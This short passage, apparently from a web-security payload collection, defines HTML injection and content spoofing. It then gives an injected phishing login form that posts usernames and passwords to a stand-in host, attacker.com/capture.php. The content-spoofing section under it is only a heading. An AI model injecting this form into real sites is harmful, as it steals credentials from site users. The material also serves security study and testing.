HTML injection (virtual displacement) and content spoofing are attacks that allow a malicious user to
inject content into a site's web pages. Content spoofing is similar to HTML inject however attackers
can only inject plaintext.

# Inject a phishing form
<form method="POST" action="http://attacker.com/capture.php" id="login-form">
  <input type="text" name="username" value="">
  <input type="password" name="password">
  <input type="submit" value="submit">
</form>

# Content-Spoofing
